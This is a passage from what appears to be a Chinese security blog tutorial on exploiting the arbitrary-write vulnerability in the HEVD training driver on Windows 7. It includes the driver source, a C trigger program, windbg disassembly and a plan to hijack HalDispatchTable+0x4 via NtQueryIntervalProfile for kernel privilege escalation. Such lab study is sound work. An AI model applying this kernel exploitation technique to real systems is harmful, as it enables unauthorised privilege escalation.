
# [原创]内核漏洞学习[4]-HEVD-ArbitraryWrite

# HEVD-ArbitraryWrite

## 一：概述

`HEVD`：漏洞靶场，包含各种 Windows 内核漏洞的驱动程序项目，在 Github 上就可以找到该项目，进行相关的学习。

<a href="elink@4fcK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Z5j5h3y4C8M7%4W2K6N6r3g2S2L8g2)9J5c8V1S2S2j5$3E0e0P5i4y4q4P5s2c8J5k6h3#2W2g2Y4g2D9L8X3g2J5j5h3u0D9k6f1c8J5K9i4k6W2M7W2)9J5c8Y4u0W2L8r3g2S2M7$3g2K6">Releases · hacksysteam/HackSysExtremeVulnerableDriver · GitHub</a>

> 环境准备：
>
> Windows 7 X86 sp1 虚拟机
>
> 使用 VirtualKD 和 windbg 双机调试
>
> HEVD 3.0 + KmdManager + DubugView

这个漏洞相对来说不算难，没有什么太多的前置知识。

## 二：漏洞点分析

分析 `ArbitraryWrite.c` 源码，`What = UserWriteWhatWhere->What; Where = UserWriteWhatWhere->Where;` 这两个指针没有验证地址是否有效，直接拿来进行读写操作。在内核模式下，对不该访问的地址进行读写会导致蓝屏。

安全版本检查内存是否正确：

- `ProbeForRead` 函数：检查用户模式缓冲区是否实际驻留在地址空间的用户部分中，并且正确对齐（MSDN）。
- `ProbeForWrite` 函数：常规检查用户模式缓冲区是否实际位于地址空间的用户模式部分，是可行的，并且正确对齐（MSDN）。

```c
NTSTATUS
TriggerArbitraryWrite(
\_In\_ PWRITE\_WHAT\_WHERE UserWriteWhatWhere
)
{
PULONG\_PTR What = NULL;
PULONG\_PTR Where = NULL;
NTSTATUS Status = STATUS\_SUCCESS;
PAGED\_CODE();
\_\_try
{
ProbeForRead((PVOID)UserWriteWhatWhere, sizeof(WRITE\_WHAT\_WHERE), (ULONG)\_\_alignof(UCHAR));
What = UserWriteWhatWhere->What;
Where = UserWriteWhatWhere->Where;
DbgPrint("[+] UserWriteWhatWhere: 0x%p\n", UserWriteWhatWhere);
DbgPrint("[+] WRITE\_WHAT\_WHERE Size: 0x%X\n", sizeof(WRITE\_WHAT\_WHERE));
DbgPrint("[+] UserWriteWhatWhere->What: 0x%p\n", What);
DbgPrint("[+] UserWriteWhatWhere->Where: 0x%p\n", Where);
#ifdef SECURE
//安全版本，对地址进行验证，是否有效。
ProbeForRead((PVOID)What, sizeof(PULONG\_PTR), (ULONG)\_\_alignof(UCHAR));
ProbeForWrite((PVOID)Where, sizeof(PULONG\_PTR), (ULONG)\_\_alignof(UCHAR));
\*(Where) = \*(What);
#else
DbgPrint("[+] Triggering Arbitrary Write\n");
\*(Where) = \*(What);
#endif
}
\_\_except (EXCEPTION\_EXECUTE\_HANDLER)
{
Status = GetExceptionCode();
DbgPrint("[-] Exception Code: 0x%X\n", Status);
}
return Status;
}
```

## 三：漏洞利用

在不安全的版本中，没有对两个指针 `what` 和 `where` 指向的地址进行验证，那我们可以利用这点，让指针访问我们的 shellcode 的位置，执行 shellcode 从而提权。

那么现在的问题就是 `what` 和 `where` 中写入什么内容，如何访问执行到我们的 shellcode。

1. 存在漏洞的 `ArbitraryWriteIoctlHandler` 函数对应的 IO 控制码 `HEVD\_IOCTL\_ARBITRARY\_WRITE`：

```c
case HEVD\_IOCTL\_ARBITRARY\_WRITE:
DbgPrint("\*\*\*\*\*\* HEVD\_IOCTL\_ARBITRARY\_WRITE \*\*\*\*\*\*\n");
Status = ArbitraryWriteIoctlHandler(Irp, IrpSp);
DbgPrint("\*\*\*\*\*\* HEVD\_IOCTL\_ARBITRARY\_WRITE \*\*\*\*\*\*\n");
break;
```

2. `\_WRITE\_WHAT\_WHERE` 结构，8 个字节大小，`what` 和 `where` 各占四个字节。所以先构造一个大小为 8 的 buf，修改 `what` 和 `where` 指针，实现任意地址写：

```c
typedef struct \_WRITE\_WHAT\_WHERE
{
PULONG\_PTR What;
PULONG\_PTR Where;
} WRITE\_WHAT\_WHERE, \*PWRITE\_WHAT\_WHERE;
```

3. 任意地址写测试：

```c
#include<stdio.h>
#include<Windows.h>
typedef struct \_WRITE\_WHAT\_WHERE
{
PULONG\_PTR What;
PULONG\_PTR Where;
} WRITE\_WHAT\_WHERE, \* PWRITE\_WHAT\_WHERE;
int main()
{
PWRITE\_WHAT\_WHERE Buffer;
Buffer = (WRITE\_WHAT\_WHERE\*)malloc(sizeof(WRITE\_WHAT\_WHERE));
ZeroMemory(Buffer, sizeof(WRITE\_WHAT\_WHERE));
Buffer->Where = (PULONG\_PTR)0x41414141;
Buffer->What = (PULONG\_PTR)0x41414141;
DWORD recvBuf;
// 获取句柄
HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
GENERIC\_READ | GENERIC\_WRITE,
NULL,
NULL,
OPEN\_EXISTING,
NULL,
NULL);
if (hDevice == INVALID\_HANDLE\_VALUE || hDevice == NULL)
{
printf("Failed \n");
return 0;
}
DeviceIoControl(hDevice, HEVD\_IOCTL\_ARBITRARY\_WRITE, Buffer, 8, NULL, 0, &recvBuf, NULL);
return 0;
}
```

运行，触发漏洞。

![](upload/attach/202111/921642\_TSKQKAZ737VNUNJ.jpg)

4. 任意代码执行测试

上述的测试已经实现任意地址写，我们将 shellcode 写入，如何实现执行 payload 呢？

首先要 `what` 指针覆盖为 payload 的地址，`where` 指针修改为能指向 payload 地址的指针：

```
what -> &payload
where -> HalDispatchTable+0x4
```

前人已经发现了 Windows 不常被使用的一个函数，利用函数 `NtQueryIntervalProfile` 可以实现 shellcode 的执行，达到任意代码执行效果。

`windbg` 反汇编 `NtQueryIntervalProfile` 函数：

```c
kd> uf nt!NtQueryIntervalProfile
.........
84160ecd 7507 jne nt!NtQueryIntervalProfile+0x6b (84160ed6) Branch
nt!NtQueryIntervalProfile+0x64:
84160ecf a1acebf783 mov eax,dword ptr [nt!KiProfileInterval (83f7ebac)]
84160ed4 eb05 jmp nt!NtQueryIntervalProfile+0x70 (84160edb) Branch
nt!NtQueryIntervalProfile+0x6b:
84160ed6 e83ae5fbff call nt!KeQueryIntervalProfile (8411f415)
.........
```

`84160ed6` 处会调用函数 `KeQueryIntervalProfile`，反编译此函数：

```
kd>uf nt!KeQueryIntervalProfile
..........
nt!KeQueryIntervalProfile+0x14:
8411f429 8945f0 mov dword ptr [ebp-10h],eax
8411f42c 8d45fc lea eax,[ebp-4]
8411f42f 50 push eax
8411f430 8d45f0 lea eax,[ebp-10h]
8411f433 50 push eax
8411f434 6a0c push 0Ch
8411f436 6a01 push 1
8411f438 ff15fcf3f783 call dword ptr [nt!HalDispatchTable+0x4 (83f7f3fc)]
8411f43e 85c0 test eax,eax
8411f440 7c0b jl nt!KeQueryIntervalProfile+0x38 (8411f44d) Branch
..........
```

`8411f438` 处有指针数组，`call dword ptr [nt!HalDispatchTable+0x4`，这里就是我们 payload 要覆盖的地方，执行 Ring0 Shellcode 的主体必须是 Ring0 程序。这种利用方法是这样的：设法修改内核 API 导出表（如 SSDT、HalDispatchTable 等），将内核 API 函数指针修改为事先准备好的 Shellcode 地址，然后在本进程中调用这个内核 API。最好选择劫持那些冷门内核 API 函数，否则一旦别的进程也调用这个 API，由于 Shellcode 只保存在当前进程的 Ring3 内存地址中，别的进程无法访问到，将导致内存访问错误或内核崩溃。

利用漏洞将 `HalDispatchTable` 表第一个函数 `HalQuerySystemInformation` 入口地址篡改，最后调用该函数的上层封装函数 `NtWueryIntervalProfile`，从而执行 Ring0 Shellcode。

`HalDispatchTable` 结构：

```c
HAL\_DISPATCH HalDispatchTable = {
HAL\_DISPATCH\_VERSION,
xHalQuerySystemInformation,//此处
xHalSetSystemInformation,
xHalQueryBusSlots,
xHalDeviceControl,
xHalExamineMBR,
xHalIoAssignDriveLetters,
xHalIoReadPartitionTable,
xHalIoSetPartitionInformation,
xHalIoWritePartitionTable,
xHalHandlerForBus, // HalReferenceHandlerByBus
xHalReferenceHandler, // HalReferenceBusHandler
xHalReferenceHandler // HalDereferenceBusHandler
};
```

在查 `HalDispatchTable` 结构、`NtQueryIntervalProfile` 函数的过程中，发现这个利用的内容很多，可以更进一步学习。

### 利用过程

> 1. 获取 `HalDispatchTable` 地址 + 0x4 的地址
>
> 2. 编写 Ring0 payload
>
> 3. 利用漏洞向 `HalDispatchTable` 地址 + 0x4 的地址处写入 `&payload`
>
> 4. 调用 `NtQueryIntervalProfile`，执行 payload

#### 1. 获取 `HalDispatchTable` 地址 + 0x4 的地址

思路是先得到内核模块基址，将其与 `HalDispatchTable` 在内核模块中的偏移相加。

> 获取 `ntkrnlpa.exe` 基址，在内核模式下
> `ntkrnlpa.exe` 基址，在用户模式下
> `HalDispatchTable` 地址，在用户模式下
> 计算 `HalDispatchTable+0x4` 的地址，利用偏移，地址是内核模式下的

官方给出的函数 `HalDispatchTable = GetHalDispatchTable();`
